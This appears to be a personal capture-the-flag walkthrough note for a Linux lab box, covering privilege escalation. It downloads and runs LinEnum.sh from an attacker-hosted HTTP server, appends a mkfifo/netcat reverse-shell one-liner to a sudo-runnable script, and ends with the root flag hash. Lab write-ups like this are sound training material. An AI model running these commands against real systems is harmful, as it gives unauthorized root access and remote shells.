[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks

```pug
sudo python3 -m http.server 8080
```
Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script
`chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it



```shell-session
[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```
we could have checked with `sudo -l`


reverse shell one liner
```pug
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.65 8443 >/tmp/f' | tee -a monitor.sh
```
listen
```pug
nc -lvnp 8443
```
and start
```pug
sudo ./monitor.sh
```

-> root access



Escalate privileges and submit the root.txt flag.

de5e5d6619862a8aa5b9b212314e0cdd
![[Pasted image 20240427173540.png]]